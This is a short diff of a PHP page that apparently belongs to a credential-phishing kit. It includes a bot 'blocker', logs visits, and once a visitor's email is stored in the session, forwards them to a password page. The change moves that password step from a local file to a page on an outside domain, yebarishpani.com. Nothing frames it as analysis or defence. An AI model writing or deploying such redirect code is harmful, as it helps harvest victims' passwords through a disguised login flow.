@@ -6,7 +6,7 @@ require 'core/blocker.php';
 logger("[VISIT] {$_SERVER['REQUEST_URI']} - 200");
 
 if(isset($_SESSION['email'])) {
-    echo '<script>window.location = "pass.php";</script>';
+    echo '<script>window.location = "https://yebarishpani.com/asasa/pass.php";</script>';
     exit();
 }
 
